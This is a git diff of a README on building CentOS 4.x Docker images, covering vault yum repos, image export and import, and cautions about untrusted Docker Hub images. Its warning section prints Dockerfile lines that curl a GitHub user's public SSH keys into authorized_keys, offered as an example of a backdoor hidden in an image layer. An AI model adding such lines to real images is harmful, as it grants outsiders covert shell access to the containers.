@@ -71,10 +71,11 @@ Note that 4.9 was never released as ISOs, so you have to `yum update` from 4.8 t
 # BUILD A DOCKERFILE TO MAKE AN IMAGE
 
 1. We build a Dockerfile to import the image.
-   * this is not strictly necessary, since we could simply 
-     `docker import centos46_i386.tar bdobyns/centos4.6_i386`    
+   * this is not strictly necessary, since we could simply   
+     `docker import centos46_i386.tar bdobyns/centos4.6_i386`       
      but that does not allow us to fixup the repo    
-2. In the Dockerfile, we follow [2k0ri's recipe](https://hub.docker.com/r/2k0ri/centos4-64-vault/~/dockerfile/) for pointing the yum repos properly to the vault, which you will need to do to use yum to install anything at all.  Because we are trying to make a specific version of the image (4.4 or 4.6) we need to edit the 4.9 in the recipe for the version we intend.  
+2. In the Dockerfile, we follow [2k0ri's recipe](https://hub.docker.com/r/2k0ri/centos4-64-vault/~/dockerfile/) for pointing the yum repos properly to the vault, which you will need to do to use yum to install anything at all.     
+   Because we are trying to make a specific version of the image (4.4 or 4.6) we need to edit the 4.9 in the recipe for the version we intend.  
 3. The example below is for Centos 4.6 
 
 ```
@@ -103,7 +104,7 @@ RUN sed -ri -e 's/^mirrorlist/#mirrorlist/g' -e 's/#baseurl=http:\/\/mirror\.cen
 # https://hub.docker.com/r/2k0ri/centos4-64-vault/~/dockerfile/
 ```
 
-4. Build with   
+* Build with   
    `docker build bdobyns/centos4.6_i386 .`
 
 
@@ -111,7 +112,7 @@ RUN sed -ri -e 's/^mirrorlist/#mirrorlist/g' -e 's/#baseurl=http:\/\/mirror\.cen
 
 # SPECIAL CONSIDERATION FOR CENTOS 4.9
 
-1. There are no ISO images for 4.9, so you have to start with 4.8 first, and then `yum update` to 4.9.  
+* There are no ISO images for 4.9, so you have to start with 4.8 first, and then `yum update` to 4.9.  
 
 ```
 # Make a Centos4.9 from a Centos4.8
@@ -131,7 +132,8 @@ RUN yum update -y
 # https://hub.docker.com/r/2k0ri/centos4-64-vault/~/dockerfile/
 ```
 
-2. However, this modifies nearly every file in the image, doubling it's size.   So it goes from being a 650Mb image to being a 1.2Gb image.  That's annoying.
+2. However, this modifies nearly every file in the image, doubling it's size.    
+   So it goes from being a 650Mb image to being a 1.2Gb image.  That's annoying.
    1. Get your image id from `docker images`
    1. `docker export d8792700441c >centos49_i386.tar`
    1. `docker import centos49_i386.tar bdobyns/centos4.9_i386`
@@ -163,15 +165,21 @@ While both [fatherlinux/centos4-base](https://hub.docker.com/r/fatherlinux/cento
 
 # TINFOIL HATS AND PARANOIA
 
-* Why should you ever build an image at all? Because you know the [Docker Hub](https://hub.docker.com) is just *full* of tasty images.
-* Because you don't trust most of them.  The [Official Ubuntu](https://hub.docker.com/_/ubuntu/) can be trusted perhaps, or the [Official Debian](https://hub.docker.com/_/debian/) or [Official Centos](https://hub.docker.com/_/centos/), 
-  * but you should *NEVER NEVER* trust any non-official image.   It's too easy for a developer to sneak in a layer with their public ssh keys in some tasty image you want to use.  *Don't do it.*
-* Did you know that all your favorite public keys are globally visible?  
-  * For example,  `curl https://github.com/bdobyns.keys` and see.
-  * this makes it easy to add a run line to a Dockerfile like   
-  `RUN curl https://github.com/bdobyns.keys >>/home/ubuntu/.ssh/authorized.keys`    
-  `RUN curl https://github.com/bdobyns.keys >>/.ssh/authorized.keys`    
-  Not useful to you?  It's useful to *attackers*.   That's in a layer you didn't notice.
+1. Why should you ever build an image at all?  You *know* the [Docker Hub](https://hub.docker.com) is just *full* of tasty images, right?
+2. Because you don't trust most of them.  
+2. The [Official Ubuntu](https://hub.docker.com/_/ubuntu/) can be trusted perhaps, or the [Official Debian](https://hub.docker.com/_/debian/) or [Official Centos](https://hub.docker.com/_/centos/), 
+  1. but you should *NEVER NEVER* trust any non-official image.   
+  1. It's too easy for a developer to sneak in a layer with their public ssh keys in some tasty image you want to use.  
+  1. Or sneak in a layer with a compromised executable (like apache, or an apache module) that you don't notice.
+    1. it can even be a *vaild* older release, just one that has a vulnerability unpatched.
+  1. *Don't do it.*
+1. Did you know that all your favorite public keys are globally visible?  
+  1. For example,  `curl https://github.com/bdobyns.keys` and see.
+  1. this makes it easy to add a run line to a Dockerfile like   
+     `RUN curl https://github.com/bdobyns.keys >>/home/ubuntu/.ssh/authorized.keys`    
+     `RUN curl https://github.com/bdobyns.keys >>/.ssh/authorized.keys`
+  1. Not useful to you?  It's useful to *attackers*.   That's in a layer you didn't notice.   
+     Heck, it may be in every docker image I ever build from now on.
 
 
 
@@ -179,7 +187,7 @@ While both [fatherlinux/centos4-base](https://hub.docker.com/r/fatherlinux/cento
 # OLD DISTROS HAVE SECURITY BUGS
 
 * If you actually use one of these Centos4.x images, you may want to look carefully at [2k0ri's recipe](https://hub.docker.com/r/2k0ri/centos4-64-vault/~/dockerfile/) for updating bash to avoid the *shellshocked* bug.  Or be very very careful that you never run `bash` in your container.
-
+* That's why they are *old* and *abandoned*.
 
 
 
